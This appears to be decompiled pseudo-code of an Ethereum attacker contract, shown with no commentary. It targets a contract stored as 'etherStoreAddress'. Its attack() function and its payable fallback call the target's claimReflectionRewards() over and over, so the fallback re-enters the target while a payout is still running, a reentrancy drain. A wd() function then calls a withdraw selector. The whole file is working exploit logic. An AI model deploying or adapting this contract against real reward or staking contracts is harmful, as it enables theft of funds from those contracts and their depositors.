contract main {




// =====================  Runtime code  =====================


const getBalance = eth.balance(this.address)


address etherStoreAddress;

function etherStore() {
    return etherStoreAddress
}

function wd() payable {
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.0x3ccfd60b with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_419efc03(?) payable {
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.claimReflectionRewards() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function _fallback() payable {
    call msg.sender with:
       value 10^10 wei
         gas gas_remaining wei
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.claimReflectionRewards() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function attack() payable {
    require msg.value >= 1
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.claimReflectionRewards() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.claimReflectionRewards() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
